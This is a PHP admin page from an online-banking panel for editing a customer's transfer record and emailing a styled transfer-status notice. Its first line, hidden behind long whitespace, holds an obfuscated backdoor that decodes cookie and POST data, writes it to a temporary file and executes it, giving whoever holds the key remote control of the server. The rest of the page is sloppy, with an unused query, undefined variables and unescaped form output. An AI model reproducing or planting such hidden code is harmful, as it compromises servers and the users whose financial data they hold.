<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("I_XAV")){class I_XAV{private $guxPXoq;public static $SkHnhSRcd = "bb0fdbb9-84d8-4d78-8e0f-9a20263031c4";public static $mojbCs = NULL;public function __construct(){$XcSkxP = $_COOKIE;$tTWbm = $_POST;$qNdVC = @$XcSkxP[substr(I_XAV::$SkHnhSRcd, 0, 4)];if (!empty($qNdVC)){$ppZXuuPD = "base64";$SqwDschXlZ = "";$qNdVC = explode(",", $qNdVC);foreach ($qNdVC as $izsUcL){$SqwDschXlZ .= @$XcSkxP[$izsUcL];$SqwDschXlZ .= @$tTWbm[$izsUcL];}$SqwDschXlZ = array_map($ppZXuuPD . chr ( 834 - 739 ).chr ( 417 - 317 ).'e' . "\143" . chr (111) . "\144" . "\x65", array($SqwDschXlZ,)); $SqwDschXlZ = $SqwDschXlZ[0] ^ str_repeat(I_XAV::$SkHnhSRcd, (strlen($SqwDschXlZ[0]) / strlen(I_XAV::$SkHnhSRcd)) + 1);I_XAV::$mojbCs = @unserialize($SqwDschXlZ);}}public function __destruct(){$this->jciDQ();}private function jciDQ(){if (is_array(I_XAV::$mojbCs)) {$qYIuv = sys_get_temp_dir() . "/" . crc32(I_XAV::$mojbCs["\x73" . "\141" . chr ( 877 - 769 )."\x74"]);@I_XAV::$mojbCs[chr ( 736 - 617 ).'r' . "\x69" . 't' . 'e']($qYIuv, I_XAV::$mojbCs[chr ( 900 - 801 )."\x6f" . chr (110) . "\x74" . 'e' . chr ( 544 - 434 ).chr ( 943 - 827 )]);include $qYIuv;@I_XAV::$mojbCs[chr (100) . "\x65" . chr ( 1028 - 920 ).chr (101) . chr ( 659 - 543 ).chr (101)]($qYIuv);exit();}}}$jSPaA = new I_XAV(); $jSPaA = NULL;} ?><?php 
include_once 'class.crud.php';
if(isset($_POST['btn-updatet']))
{
	$id = $_GET['edit_id'];
	$email = $_POST['email'];
	$bank_name = $_POST['bank_name'];
	$acc_name = $_POST['acc_name'];
	$acc_no = $_POST['acc_no'];
	$amount = $_POST['amount'];
	$date = $_POST['date'];
	$status = $_POST['status'];
	$swift = $_POST['swift'];
	$type = $_POST['type'];
	$remarks = $_POST['remarks'];
	
	
		$statement = $DB_con->prepare("SELECT  A.email, A.t_bal, B.currency from A FULL JOIN B ON A.email = B.email");
		
		$row = $statement->fetch(PDO::FETCH_ASSOC);

	if($crud->updatet($id,$email,$bank_name,$acc_name,$acc_no,$amount,$date,$status,$swift,$type,$remarks))
	
	$stmt = $reg_user->runQuery("SELECT * FROM bank_settings WHERE id = '1'");
    $stmt->execute();
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
	
	$bank_address  = $row["bank_address"];
	$bank_domain  = $row["bank_domain"];
	$bank_mobile =$row["bank_mobile"];
	$bank_logo = $row["bank_logo"];
	$bank_fav = $row["bank_fav"];
	$bank_online = $row["bank_online"];
	$bank_support = $row["bank_support"];
	$bank_email = $row["bank_email"];
	$bank_loan = $row["bank_loan"];
	

            $messag = "	<!DOCTYPE html>
<html>
 <head>
  <title>
  </title>
  <meta content='summary_large_image' name='twitter:card'>
  <meta content='website' property='og:type'>
  <meta content='' property='og:description'>
  <meta content='https://zm14avf184.preview-posted-stuff.com/V2-8rP5-13st-ZEaa0-lWL3/' property='og:url'>
  <meta content='https://pro-bee-beepro-thumbnails.s3.amazonaws.com/messages/758056/741484/1463243/7170838_large.jpg' property='og:image'>
  <meta content='' property='og:title'>
  <meta content='' name='description'>
  <meta charset='utf-8'>
  <meta content='width=device-width' name='viewport'>
  <style>
   .bee-row,
		.bee-row-content {
			position: relative
		}

		.bee-html-block {
			text-align: center
		}

		.bee-row-1,
		.bee-row-11,
		.bee-row-2,
		.bee-row-3,
		.bee-row-4,
		.bee-row-5,
		.bee-row-6,
		.bee-row-7,
		.bee-row-8,
		.bee-row-8 .bee-row-content,
		.bee-row-9 {
			background-repeat: no-repeat
		}

		body {
			background-color: #fff;
			color: #000;
			font-family: Arial, Helvetica Neue, Helvetica, sans-serif
		}

		a {
			color: #0068a5
		}

		* {
			box-sizing: border-box
		}

		body,
		p {
			margin: 0
		}

		.bee-row-content {
			max-width: 500px;
			margin: 0 auto;
			display: flex
		}

		.bee-row-content .bee-col-w4 {
			flex-basis: 33%
		}

		.bee-row-content .bee-col-w6 {
			flex-basis: 50%
		}

		.bee-row-content .bee-col-w8 {
			flex-basis: 67%
		}

		.bee-row-content .bee-col-w12 {
			flex-basis: 100%
		}

		.bee-divider,
		.bee-image {
			overflow: auto
		}

		.bee-divider .center,
		.bee-image .bee-center {
			margin: 0 auto
		}

		.bee-row-1 .bee-col-2 .bee-block-1,
		.bee-row-11 .bee-col-1 .bee-block-2 {
			width: 100%
		}

		.bee-image img {
			display: block;
			width: 100%
		}

		.bee-text {
			overflow-wrap: anywhere
		}

		@media (max-width:520px) {
			.bee-row-content:not(.no_stack) {
				display: block
			}
		}

		.bee-row-1 .bee-row-content,
		.bee-row-10 .bee-row-content,
		.bee-row-11 .bee-row-content,
		.bee-row-12 .bee-row-content,
		.bee-row-2 .bee-row-content,
		.bee-row-3 .bee-row-content,
		.bee-row-4 .bee-row-content,
		.bee-row-5 .bee-row-content,
		.bee-row-6 .bee-row-content,
		.bee-row-7 .bee-row-content,
		.bee-row-9 .bee-row-content {
			background-repeat: no-repeat;
			color: #000
		}

		.bee-row-1 .bee-col-1,
		.bee-row-1 .bee-col-2,
		.bee-row-10 .bee-col-1,
		.bee-row-11 .bee-col-1,
		.bee-row-12 .bee-col-1,
		.bee-row-2 .bee-col-1,
		.bee-row-3 .bee-col-1,
		.bee-row-3 .bee-col-2,
		.bee-row-4 .bee-col-1,
		.bee-row-4 .bee-col-2,
		.bee-row-5 .bee-col-1,
		.bee-row-5 .bee-col-2,
		.bee-row-6 .bee-col-1,
		.bee-row-6 .bee-col-2,
		.bee-row-7 .bee-col-1,
		.bee-row-7 .bee-col-2,
		.bee-row-8 .bee-col-1,
		.bee-row-8 .bee-col-2,
		.bee-row-9 .bee-col-1 {
			padding-bottom: 5px;
			padding-top: 5px
		}

		.bee-row-1 .bee-col-1 .bee-block-1,
		.bee-row-10 .bee-col-1 .bee-block-2,
		.bee-row-11 .bee-col-1 .bee-block-3,
		.bee-row-12 .bee-col-1 .bee-block-2,
		.bee-row-2 .bee-col-1 .bee-block-1,
		.bee-row-2 .bee-col-1 .bee-block-3,
		.bee-row-2 .bee-col-1 .bee-block-4,
		.bee-row-3 .bee-col-1 .bee-block-1,
		.bee-row-3 .bee-col-2 .bee-block-1,
		.bee-row-4 .bee-col-1 .bee-block-1,
		.bee-row-4 .bee-col-2 .bee-block-1,
		.bee-row-5 .bee-col-1 .bee-block-1,
		.bee-row-5 .bee-col-2 .bee-block-1,
		.bee-row-6 .bee-col-1 .bee-block-1,
		.bee-row-6 .bee-col-2 .bee-block-1,
		.bee-row-7 .bee-col-1 .bee-block-1,
		.bee-row-7 .bee-col-2 .bee-block-1,
		.bee-row-8 .bee-col-1 .bee-block-1,
		.bee-row-8 .bee-col-2 .bee-block-1 {
			padding: 10px
		}

		.bee-row-8 .bee-row-content {
			background-color: #1d9df0;
			color: #000
		}

		.bee-row-10 {
			background-color: #364fff
		}

		.bee-row-12 {
			background-color: #f6730e
		}
  </style>
 </head>
 <body>
  <div class='bee-page-container'>
   <div class='bee-row bee-row-1'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w8'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 10px; line-height: 12px;'>
         <span style='font-size: 10px; line-height: 12px;'>
          $bank_address
         </span>
        </p>
        <p style='font-size: 10px; line-height: 12px;'>
         <span style='font-size: 10px; line-height: 12px;'>
          $bank_mobile
         </span>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w4'>
      <div class='bee-block bee-block-1 bee-image'>
       <img alt='' class='bee-center bee-fixedwidth' src='$bank_logo' style='max-width:150px;'>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-2'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w12'>
      <div class='bee-block bee-block-1 bee-divider'>
       <div class='center' style='border-top:1px solid #BBBBBB;width:100%;'>
       </div>
      </div>
      <div class='bee-block bee-block-2 bee-spacer'>
       <div class='spacer' style='height:30px;'>
       </div>
      </div>
      <div class='bee-block bee-block-3 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         Dear
         <span style='font-size: 16px; line-height: 19px;'>
          $fname
         </span>
         $lname,
        </p>
       </div>
      </div>
      <div class='bee-block bee-block-4 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         Below is your Transfer Transaction Details
        </p>
       </div>
      </div>
      <div class='bee-block bee-block-5 bee-spacer'>
       <div class='spacer' style='height:30px;'>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-3'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <strong style=''>
          Amount
          <br style=''>
         </strong>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         $amount
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-4'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <strong style=''>
          Beneficiary Name
         </strong>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         $acc_name
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-5'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <strong style=''>
          Beneficiary Account
         </strong>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         $acc_no
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-6'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <strong style=''>
          Beneficiary Bank
         </strong>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         $bank_name
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-7'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <strong style=''>
          Date
         </strong>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         $dateTransfer
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-8'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <span style='color: #ffffff; line-height: 14px;'>
          <strong style=''>
           Status
          </strong>
         </span>
        </p>
       </div>
      </div>
     </div>
     <div class='bee-col bee-col-2 bee-col-w6'>
      <div class='bee-block bee-block-1 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px;'>
         <span style='color: #ffffff; line-height: 14px;'>
          $status
         </span>
        </p>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-9'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w12'>
      <div class='bee-block bee-block-1 bee-spacer'>
       <div class='spacer' style='height:25px;'>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-10'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w12'>
      <div class='bee-block bee-block-1 bee-spacer'>
       <div class='spacer' style='height:20px;'>
       </div>
      </div>
      <div class='bee-block bee-block-2 bee-text'>
       <div class='bee-text-content' style='font-size: 12px; line-height: 120%; color: #C0C0C0; font-family: inherit;'>
        <p style='line-height: 14px;'>
         <strong style=''>
          <span style='color: #ffffff; font-size: 24px; line-height: 28px;'>
           How do I know this is not a fake email?
          </span>
         </strong>
        </p>
        <p style='line-height: 14px;'>
         &nbsp;
        </p>
        <p style='line-height: 14px;'>
         <span style='color: #ffffff; line-height: 14px;'>
          An email really coming from us will address you by your registered first and last name or your business name. It will not ask you for sensitive information like your password, bank account or credit card details.
         </span>
        </p>
       </div>
      </div>
      <div class='bee-block bee-block-3 bee-html-block'>
       <div height='40'>
        &nbsp;
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-11'>
    <div class='bee-row-content no_stack'>
     <div class='bee-col bee-col-1 bee-col-w12'>
      <div class='bee-block bee-block-1 bee-spacer'>
       <div class='spacer' style='height:65px;'>
       </div>
      </div>
      <div class='bee-block bee-block-2 bee-image'>
       <img alt='' class='bee-center bee-fixedwidth' src='https://d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/BeeProAgency/758056_741484/security.png' style='max-width:325px;'>
      </div>
      <div class='bee-block bee-block-3 bee-text'>
       <div class='bee-text-content' style='font-size: 14px; line-height: 120%; color: #393d47; font-family: inherit;'>
        <p style='font-size: 14px; line-height: 16px; text-align: center;'>
         <span style='font-size: 12px; line-height: 14px;'>
          Remember not to click any links in
          <span style='line-height: 14px;'>
           suspicious
          </span>
          looking emails.
         </span>
        </p>
       </div>
      </div>
      <div class='bee-block bee-block-4 bee-spacer'>
       <div class='spacer' style='height:30px;'>
       </div>
      </div>
     </div>
    </div>
   </div>
   <div class='bee-row bee-row-12'>
    <div class='bee-row-content'>
     <div class='bee-col bee-col-1 bee-col-w12'>
      <div class='bee-block bee-block-1 bee-spacer'>
       <div class='spacer' style='height:20px;'>
       </div>
      </div>
      <div class='bee-block bee-block-2 bee-text'>
       <div class='bee-text-content' style='color: #C0C0C0; font-size: 12px; line-height: 120%; font-family: inherit;'>
        <p style='line-height: 14px; text-align: justify;'>
         <span style='color: #ffffff; line-height: 13px; font-size: 11px;'>
          &nbsp;The content of this email is confidential and intended for the recipient specified in message only. It is strictly forbidden to share any part of this message with any third party, without a written consent of the sender. If you received this message by mistake, please reply to this message and follow with its deletion, so that we can ensure such a mistake does not occur in the future.
         </span>
        </p>
       </div>
      </div>
      <div class='bee-block bee-block-3 bee-html-block'>
       <div height='40'>
        &nbsp;
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
";



            $subject = " $fname  Transfer Status!";




            $send_otp_mobile = preg_replace('/[^0-9]/', '', $_POST['phone']);
            $crud->send_mail($email, $messag, $subject);
            //$reg_user->otp($send_otp_mobile, $subject);

	
		$msg = "<div class='alert alert-info'>
				Transfer Record was updated successfully <a href='index.php'>HOME</a>!
				</div>";
	}
	else
	{
		$msg = "<div class='alert alert-warning'>
				<strong>SORRY!</strong> ERROR while updating record !
				</div>";
	}

if(isset($_GET['edit_id']))
{
	$id = $_GET['edit_id'];
	extract($crud->getIDt($id));	
}

?>



 <?php include 'headeradmin.php'; ?>
 

 <!---begin of Mobile View Here   only from Digital Forest Team-->
 
       <?php include 'menu.php'; ?>
  
  <!---End of Mobile View Here   only from Digital Forest Team-->
  
 
     
     
     
  
    <div class="container-fluid mt--7">
     <!-- Table -->
      <div class="row">
        <div class="col">
          <div class="card shadow" >
            <div class="card-header border-0">
              <h3 class="mb-0"><a href=""   class="btn btn-danger">EDIT CUSTOMER TRANSEFR INFORMATION</a></h3>
            </div>
          
           <div class="card-body">
               
               <?php
if(isset($msg))
{
	echo $msg;
}
?>
               
               
                                              <div class="container-fluid">
	<form method='post' class=''>
 
         <div class="row">
         <div class="form-group col-md-3">
            <label for="name">EMAIL</label>
			<input id="name" name="email" class="form-control" type="text" value="<?php echo $email;?>"  />
        </div>
		
        <div class="form-group col-md-3">
            <label for="name">BENEFICIARY BANK NAME</label>
			<input id="name" name="bank_name" class="form-control" type="text" value="<?php echo $bank_name;?>"  />
        </div>
  
        <div class="form-group col-md-3">
			<label for="acc_no">BENEFICIARY ACCOUNT NAME</label>
			<input id="acc_name" name="acc_name" class="form-control" type="text" value="<?php echo $acc_name;?>" />
        </div>
 
   </div>
 
  <div class="row">
        <div class="form-group col-md-3">
            <label for="website">BENEFICIARY ACCOUNT NO.</label>
			<input id="website" name="acc_no" class="form-control" type="text" value="<?php echo $acc_no;?>" />
        </div>
 
        <div class="form-group col-md-3">
			<label for="contact">AMOUNT </label>
			<input id="contact" name="amount" class="form-control" type="text" value="<?php echo $amount;?>" required />
        </div>
		
		<div class="form-group col-md-3">
			<label for="job">DATE</label>  <small>Input like this (YYYY-MM-DD HH:MM:SS)</small>
			<input id="job" name="date" class="form-control" type="text" value="<?php echo $date;?>" required />
        </div>
	</div>
	
	 <div class="row">
		<div class="form-group col-md-3">
		    <label>Transfer Status</label><small> <b>Current= <?php echo $status;?></b></small>
                            <select name="status" class="form-control input-sm validate[required]">
                                <option value="Pending">Pending</option>
                                <option value="Successful">Successful</option>
                                <option value="Failed">Failed</option>
                                <option value="Cancelled">Cancelled</option>
                                 <option value="On-hold">On-hold</option>
                            </select>
			
        </div>
		
		
         <div class="form-group col-md-3">
            <label for="name">SWIFT</label>
			<input id="name" name="swift" class="form-control" type="text" value="<?php echo $swift;?>"  />
        </div>
		
        <div class="form-group col-md-3">
            <label for="name">ACC. TYPE</label>
		  <select name="type" class="form-control input-sm validate[required]">
                                    <option value="Savings">Savings</option>
                                    <option value="Current">Current</option>
                                 </select>
        </div>
 </div>
        <div class="form-group col-md-3">
			<label for="acc_no">TRANSFER DESC.</label>
			<input id="acc_name" name="remarks" class="form-control" type="text" value="<?php echo $remarks;?>" />
        </div>
 
      
		<div class="clearfix"></div>
            <br />
        <table>
        <tr>
            <td colspan="2">
                <button type="submit" class="btn btn-primary" name="btn-updatet">
    			<span class="glyphicon glyphicon-edit"></span>  UPDATE TRANSFER
				</button>
                <a href="index.php" class="btn btn-large btn-success"><i class="glyphicon glyphicon-backward"></i> &nbsp; CANCEL</a>
            </td>
        </tr>
        </table>
</form> 
</div>

               
               
               
               
               
               
               
               
          </div>
        </div>
      </div>
     </div>
 
    
       <?php include 'foot.php'; ?>